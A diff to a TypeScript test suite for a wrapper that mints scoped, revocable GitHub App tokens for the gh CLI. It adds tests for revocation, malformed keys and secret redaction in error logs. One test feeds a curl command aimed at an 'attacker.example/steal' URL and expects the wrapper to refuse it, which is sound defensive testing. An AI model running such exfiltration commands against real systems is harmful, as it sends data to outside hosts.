@@ -109,9 +109,9 @@ describe('fetchInstallationId and fetchInstallationToken', () => {
 		const fetchImpl = vi
 			.fn()
 			.mockResolvedValue({ ok: false, status: 403, statusText: 'Forbidden' });
-		await expect(fetchInstallationToken(fetchImpl as typeof fetch, 'jwt', 1)).rejects.toThrow(
-			/403/
-		);
+		await expect(
+			fetchInstallationToken(fetchImpl as typeof fetch, 'jwt', 1, 'Fit_')
+		).rejects.toThrow(/403/);
 	});
 });
 
@@ -141,6 +141,9 @@ function fakeDependencies(overrides: Partial<Dependencies> = {}): {
 				json: () => Promise.resolve({ token: 'installation-token-xyz' })
 			} as Response);
 		}
+		if (input.endsWith('/installation/token')) {
+			return Promise.resolve({ ok: true, status: 204, statusText: 'No Content' } as Response);
+		}
 		return Promise.reject(new Error(`Unexpected fetch: ${input}`));
 	});
 
@@ -163,7 +166,7 @@ function fakeDependencies(overrides: Partial<Dependencies> = {}): {
 }
 
 describe('run', () => {
-	it('mints a token through two requests and hands it to the child only', async () => {
+	it('mints a scoped token through two requests, hands it to the child, then revokes it', async () => {
 		const { deps, calls, spawnCalls } = fakeDependencies();
 		const env = { FIT_GITHUB_APP_KEY: '/secrets/owen.pem', PATH: '/usr/bin' };
 
@@ -171,14 +174,24 @@ describe('run', () => {
 
 		expect(exitCode).toBe(0);
 
-		expect(calls).toHaveLength(2);
+		expect(calls).toHaveLength(3);
 		const installationCall = defined(calls[0]);
 		const tokenCall = defined(calls[1]);
+		const revokeCall = defined(calls[2]);
 		expect(installationCall.url).toBe('https://api.github.com/repos/gabepsilva/Fit_/installation');
 		expect(installationCall.init?.method ?? 'GET').toBe('GET');
 		expect(authorization(installationCall)).toMatch(/^Bearer /);
 		expect(tokenCall.url).toBe('https://api.github.com/app/installations/987/access_tokens');
 		expect(tokenCall.init?.method).toBe('POST');
+		expect(JSON.parse(tokenCall.init?.body as string)).toEqual({
+			repositories: ['Fit_'],
+			permissions: { issues: 'write', pull_requests: 'write' }
+		});
+		expect(revokeCall.url).toBe('https://api.github.com/installation/token');
+		expect(revokeCall.init?.method).toBe('DELETE');
+		expect((revokeCall.init?.headers as { Authorization: string }).Authorization).toBe(
+			'token installation-token-xyz'
+		);
 
 		expect(spawnCalls).toHaveLength(1);
 		const spawnCall = defined(spawnCalls[0]);
@@ -186,6 +199,27 @@ describe('run', () => {
 		expect(spawnCall.args).toEqual(['issue', 'comment', '28', '--body', 'hello']);
 		expect(spawnCall.env.GH_TOKEN).toBe('installation-token-xyz');
 		expect(spawnCall.env.PATH).toBe('/usr/bin');
+	});
+
+	it('revokes the token even when the child command fails', async () => {
+		const { deps, calls } = fakeDependencies({ spawnChild: () => Promise.resolve(17) });
+		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
+		expect(exitCode).toBe(17);
+		expect(calls.some((call) => call.url === 'https://api.github.com/installation/token')).toBe(
+			true
+		);
+	});
+
+	it('refuses a command other than gh, without minting any token', async () => {
+		const { deps, calls, spawnCalls } = fakeDependencies();
+		const exitCode = await run(
+			['curl', 'https://attacker.example/steal'],
+			{ FIT_GITHUB_APP_KEY: '/secrets/owen.pem' },
+			deps
+		);
+		expect(exitCode).toBe(1);
+		expect(calls).toHaveLength(0);
+		expect(spawnCalls).toHaveLength(0);
 	});
 
 	it('defaults FIT_GITHUB_APP_ID to 4578638 when unset', async () => {
@@ -251,5 +285,85 @@ describe('run', () => {
 		});
 		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
 		expect(exitCode).toBe(17);
+	});
+
+	it('fails cleanly with a malformed (non-RSA) key instead of an unhandled rejection', async () => {
+		const { deps, calls, spawnCalls } = fakeDependencies({
+			readKeyFile: () => 'not a real private key'
+		});
+		const exitCode = await run(['gh'], { FIT_GITHUB_APP_KEY: '/secrets/owen.pem' }, deps);
+		expect(exitCode).toBe(1);
+		expect(calls).toHaveLength(0);
+		expect(spawnCalls).toHaveLength(0);
+	});
+
+	it('fails cleanly when FIT_GITHUB_APP_ID is not numeric', async () => {
+		const { deps, calls } = fakeDependencies();
+		const exitCode = await run(
+			['gh'],
+			{ FIT_GITHUB_APP_KEY: '/secrets/owen.pem', FIT_GITHUB_APP_ID: 'not-a-number' },
+			deps
+		);
+		expect(exitCode).toBe(1);
+		expect(calls).toHaveLength(0);
+	});
+
+	describe('secret redaction on failure paths', () => {
+		const secretKeyPath = '/secrets/owen-super-secret.pem';
+		const secretKeyContents = privateKey;
+
+		function captureConsoleErrors(): { logs: string[]; restore: () => void } {
+			const logs: string[] = [];
+			const original = console.error;
+			console.error = (...args: unknown[]) => {
+				logs.push(args.map(String).join(' '));
+			};
+			return {
+				logs,
+				restore: () => {
+					console.error = original;
+				}
+			};
+		}
+
+		it('never prints the key path contents or a minted token when the key is unreadable', async () => {
+			const { deps } = fakeDependencies({ statKeyFile: () => undefined });
+			const { logs, restore } = captureConsoleErrors();
+			try {
+				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
+			} finally {
+				restore();
+			}
+			const output = logs.join('\n');
+			expect(output).not.toContain(secretKeyContents);
+			expect(output).not.toContain('installation-token-xyz');
+		});
+
+		it('never prints the key contents or token when the installation lookup fails', async () => {
+			const fetchImpl = vi.fn().mockRejectedValue(new Error('network is down'));
+			const { deps } = fakeDependencies({ fetchImpl: fetchImpl as unknown as typeof fetch });
+			const { logs, restore } = captureConsoleErrors();
+			try {
+				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
+			} finally {
+				restore();
+			}
+			const output = logs.join('\n');
+			expect(output).not.toContain(secretKeyContents);
+			expect(output).not.toContain('installation-token-xyz');
+		});
+
+		it('never prints the key contents when minting the JWT fails on a malformed key', async () => {
+			const { deps } = fakeDependencies({ readKeyFile: () => 'not a real private key' });
+			const { logs, restore } = captureConsoleErrors();
+			try {
+				await run(['gh'], { FIT_GITHUB_APP_KEY: secretKeyPath }, deps);
+			} finally {
+				restore();
+			}
+			const output = logs.join('\n');
+			expect(output).not.toContain(secretKeyContents);
+			expect(output).not.toContain('not a real private key');
+		});
 	});
 });
